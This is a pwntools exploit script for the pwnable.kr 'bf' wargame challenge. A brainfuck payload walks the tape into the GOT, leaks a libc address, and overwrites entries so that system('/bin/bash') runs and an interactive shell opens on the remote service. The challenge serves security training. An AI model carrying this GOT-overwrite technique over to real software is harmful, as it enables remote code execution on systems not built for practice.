#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("bf")
# libc = ELF("bf_libc.so") 
libc = ELF("/lib32/libc.so.6")      # local, for testing & debugging

'''SAMPLE USAGE:'''

host = "pwnable.kr"
port = 9001

gs = '''
b *0x08048655
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)


'''

FULL PLAN:
0. p = tape at the start which is at 0804a0a0, while putchar@.got.plt is at 0804a030
    the delta is 0x70 = 112. also note we must send our response in one go.
1. bf_buffer - we do rules['dec']*144 to get to fgets@.got.plt
2. bf_buffer - we read it. we are now at -140.
3. bf_buffer - we do rules['dec']*4 to get back to fgets@.got.plt
4. bf_buffer - we overwrite fgets@.got.plt, we are now at -140.
5. bf_buffer - we go up 24 to get to memset. we are now at -116
6. bf_buffer - we overwrite memset@.got.plt, we are now at -112, which is putchar@.got.plt
7. bf_buffer - we overwrite putchar@.got.plt.
8. bf_buffer - we call rules['read'] to trigger the return to main

0.  io        - prologue. recv and send bf_buffer.
9.  io        - we recv() to get the address of fgets@libc - this is the io part of    #2
10. io        - we send system@libc in order to overwrite fgets@.got.plt this is io of #4
11. io        - we send fgets@libc in order to overwrite memset@.got.plt this is io of #6
12. io        - we send main_addr in order to overwrite putchar@.got.plt this is io of #7
13. io        - we recv() because we started main again.
14. io        - we send "/bin/bash"
15. io        - go interactive()

'''

# EXPLOIT CODE HERE:
# =============================================================================

rules = {
    "write"     : b',',
    "read"      : b'.',
    "inc"       : b'>',
    "dec"       : b'<'
}

OVERWRITE_ADDR = ( rules['write'] + rules['inc'] )*4
READ_ADDR = ( rules['read'] + rules['inc'] )*4

bf_buffer  = rules['dec']*144                       # 1
bf_buffer += READ_ADDR                              # 2
bf_buffer += rules['dec']*4                         # 3
bf_buffer += OVERWRITE_ADDR                         # 4
bf_buffer += rules['inc']*24                        # 5
bf_buffer += OVERWRITE_ADDR                         # 6
bf_buffer += OVERWRITE_ADDR                         # 7
bf_buffer += rules['read']

io = start()
io.timeout = 0.1

print(io.recv().decode())
io.sendline(bf_buffer)

fgets_at_got_plt = u32(io.recv(4))
libc.address = 0

libc.address = fgets_at_got_plt - libc.sym.fgets
# libc.address = 0xf7dec000             # for debugging with gdb

print("calculated libc address is: " + hex(libc.address))      # 9

msg  = b""
msg += p32(libc.sym.system)
msg += p32(libc.sym.gets)                        
msg += p32(elf.sym.main)                               # 12

input_to_gets = b"/bin/bash"

if args.LOG:
    open("LOG_IO", "wb").write(msg)
    open("LOG_BF", "wb").write(bf_buffer)
    open("LOG", "wb").write(bf_buffer + b'\n' + msg + input_to_gets + b'\n')


io.sendline(msg+input_to_gets)
print(io.recv().decode())                           # 13


# =============================================================================


io.interactive()                                    # 15

